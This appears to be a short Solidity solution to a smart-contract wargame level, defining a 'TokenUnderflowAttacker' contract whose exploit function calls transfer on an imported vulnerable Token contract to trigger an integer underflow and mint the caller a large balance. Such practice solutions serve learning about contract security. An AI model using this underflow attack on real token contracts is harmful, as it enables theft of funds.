// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Token.sol";

contract TokenUnderflowAttacker {
    Token public token;
    
    constructor(address _tokenAddress) public {
        token = Token(_tokenAddress);
    }
    
    function exploit() external {
        // Attempt to exploit underflow
        token.transfer(msg.sender, 21);
    }
}